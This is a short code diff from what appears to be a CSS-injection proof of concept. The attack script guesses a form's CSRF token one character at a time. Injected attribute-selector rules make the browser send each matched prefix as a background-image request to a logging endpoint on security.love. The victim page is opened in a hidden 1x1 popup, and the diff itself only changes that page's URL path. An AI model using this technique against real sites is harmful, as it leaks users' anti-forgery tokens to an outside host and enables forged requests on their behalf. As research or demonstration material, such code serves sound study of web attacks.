@@ -71,7 +71,7 @@
 #sensitiveForm input[value^='${csrfToken}8'] { background-image: url(https://security.love/log.php/${csrfToken}8); }
 #sensitiveForm input[value^='${csrfToken}9'] { background-image: url(https://security.love/log.php/${csrfToken}9); }`
             var win2 = window.open('https://security.love/anything', 'f', "top=100000,left=100000,menubar=1,resizable=1,width=1,height=1")
-            var win2 = window.open(`https://security.love/victim.html?injection=${css}`, 'f', "top=100000,left=100000,menubar=1,resizable=1,width=1,height=1")
+            var win2 = window.open(`https://security.love/cssInjection/victim.html?injection=${css}`, 'f', "top=100000,left=100000,menubar=1,resizable=1,width=1,height=1")
             win2.blur();
             var newCount = count + 1;
             if(csrfToken.length == 20){
